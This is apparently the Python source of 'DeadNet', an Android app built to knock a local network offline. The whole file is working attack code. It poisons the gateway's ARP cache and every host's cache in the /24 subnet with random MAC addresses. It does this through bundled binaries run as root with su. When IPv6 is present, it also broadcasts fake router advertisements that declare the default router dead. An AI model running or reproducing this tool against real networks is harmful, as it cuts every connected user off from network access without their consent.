#!/usr/bin/env python3

import os
import re
import logging
import netifaces
import ipaddress
import subprocess
import platform as pt
from threading import Condition

from utils import *

from android.permissions import request_permissions, Permission

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
from scapy.all import *
conf.verb = 0


#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   ....................................................................................................................
#   ....................................... ____ ............... _ _ . _ .... _ ........................................
#   .......................................|  _ \  ___  __ _  __| | \ | | ___| |_ ......................................
#   .......................................| | | |/ _ \/ _` |/ _` |  \| |/ _ \ __|......................................
#   .......................................| |_| |  __/ (_| | (_| | |\  |  __/ |_ ......................................
#   .......................................|____/ \___|\__,_|\__,_|_| \_|\___|\__|......................................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------


class DeadNetAPK:
    _BINARY_MAP = {
        "x86_64": "x86_64",
        "arm": "arm",
        "aarch64": "arm64",
        "i386": "i386",
    }
    MISSING_ANDROID_PERMISSIONS = [Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET, Permission.ACCESS_WIFI_STATE,
                                   Permission.ACCESS_NETWORK_STATE, Permission.ACCESS_FINE_LOCATION,
                                   Permission.CHANGE_WIFI_STATE]
    CONDITION_ANDROID_PERMISSIONS = Condition()

    def __init__(self, iface, gateway_ipv4, gateway_ipv6, gateway_mac=None, print_mtd=None):
        self.print_mtd = print_mtd

        self.network_interface = iface
        conf.iface = self.network_interface

        self.my_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
        self.loop_count = 0

        self.abort = str()
        self.user_abort_reason = f"status - {RED}stopped{COLOR_RESET}"

        self.arch_type = self._BINARY_MAP.get(pt.machine())
        if not self.arch_type:
            raise Exception(f"unsupported device machine architecture -> {pt.machine()}")

        # Get the full path to the binary
        arp_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'arp.{self.arch_type}')
        self.arp_path = f'/data/data/org.deadnet.deadnet/arp.{self.arch_type}'
        nra_orig_path2 = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'nra.{self.arch_type}')
        self.nra_path = f'/data/data/org.deadnet.deadnet/nra.{self.arch_type}'

        for [src_path, bin_path] in [[arp_orig_path, self.arp_path],
                                     [nra_orig_path2, self.nra_path]]:
            subprocess.run(f"cp -rf {src_path} {bin_path}", stdout=subprocess.PIPE, shell=True)
            subprocess.run(f"chmod 777 {bin_path}", stdout=subprocess.PIPE, shell=True)
            subprocess.run(f"chown root {bin_path}", stdout=subprocess.PIPE, shell=True)

        self.gateway_ipv6 = gateway_ipv6
        self.ipv6_prefix, self.ipv6_preflen = self.get_ipv6_data() if self.gateway_ipv6 != "undefined" else (None, None)

        self.spoof_ipv6ra = self.ipv6_prefix and self.ipv6_preflen

        self.user_ipv4 = get_if_addr(self.network_interface)

        self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/24"  # assuming CIDR length is 24

        self.gateway_ipv4 = gateway_ipv4
        self.gateway_mac = gateway_mac or getmacbyip(self.gateway_ipv4)
        self.gateway_mac_fake = RandMAC()
        if not self.gateway_mac:
            raise Exception(f"Unable to get gateway MAC address")

        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                           str(host_ip) != self.user_ipv4 and str(host_ip) != self.gateway_ipv4]

        self.intro = str()
        if self.spoof_ipv6ra:
            self.intro += f"Dead router attack (IPv6) - {GREEN}enabled{COLOR_RESET}\n" \
                          f"IPv6 prefix - {self.ipv6_prefix}/{self.ipv6_preflen}\n" \
                          f"IPv6 gateway - {self.gateway_ipv6}\n\n"
        else:
            self.intro += f"Dead router attack (IPv6) - {RED}disabled{COLOR_RESET}\n\n"

        self.intro += f"ARP poisoning (IPv4) - {GREEN}enabled{COLOR_RESET}\n" \
                      f"IPv4 subnet range - {self.subnet_ipv4_sr}\n" \
                      f"IPv4 gateway - {self.gateway_ipv4}\n\n"

    @staticmethod
    def permissions_callback(permissions, results):
        DeadNetAPK.MISSING_ANDROID_PERMISSIONS.clear()
        if not all(results):
            for perm, result in zip(permissions, results):
                if not result:
                    DeadNetAPK.MISSING_ANDROID_PERMISSIONS.append(perm)
        with DeadNetAPK.CONDITION_ANDROID_PERMISSIONS:
            DeadNetAPK.CONDITION_ANDROID_PERMISSIONS.notify()

    def get_ipv6_data(self):
        prefix, preflen = str(), int()
        try:
            ipv6_data = netifaces.ifaddresses(self.network_interface)
            for data_dict in ipv6_data[netifaces.AF_INET6]:
                if "fe80::" not in data_dict['addr']:
                    try:
                        prefix = f"{':'.join(data_dict['addr'].split(':')[:4])}::"
                        preflen = int(data_dict['netmask'].split('/')[-1])
                    except Exception as exc:
                        pass
        except Exception as exc:
            pass
        return prefix, preflen

    def user_abort(self):
        self.abort = self.user_abort_reason

    def poison_arp(self):
        """
        * poison the gateway arp cache with a spoofed mac address for every possible host
        * poison every possible host with a spoofed mac address for the gateway
        """
        for idx, host_ip in enumerate(self.host_ipv4s):
            if self.abort:
                return
            if self.spoof_ipv6ra:
                if idx % 5 == 0:
                    self.poison_ra()
            subprocess.Popen(
                f"su -c {self.arp_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(
                f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.print_mtd(f"{self.intro}status - {GREEN}running...{COLOR_RESET} cycle #{self.loop_count} "
                           f"{GRAY}[{idx + 1} / {len(self.host_ipv4s)}]{COLOR_RESET}")

    def poison_ra(self):
        """
        * Broadcast a fake dead default router message
        """
        subprocess.Popen(f"su -c {self.nra_path} {self.gateway_mac} {self.gateway_ipv6} "
                         f"{self.ipv6_prefix} {self.ipv6_preflen} {self.network_interface}",
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def start_attack(self):
        while not self.abort:
            try:
                self.loop_count += 1
                self.poison_arp()
            except Exception as exc:
                self.abort = traceback.format_exc()
            except KeyboardInterrupt:
                self.user_abort()

        if self.abort != self.user_abort_reason:
            self.print_mtd(f"{self.abort}", True)
        else:
            self.print_mtd(f"{self.intro}{self.abort}")


def request_user_permissions():
    request_permissions(DeadNetAPK.MISSING_ANDROID_PERMISSIONS, DeadNetAPK.permissions_callback)
    with DeadNetAPK.CONDITION_ANDROID_PERMISSIONS:
        DeadNetAPK.CONDITION_ANDROID_PERMISSIONS.wait()


request_user_permissions()
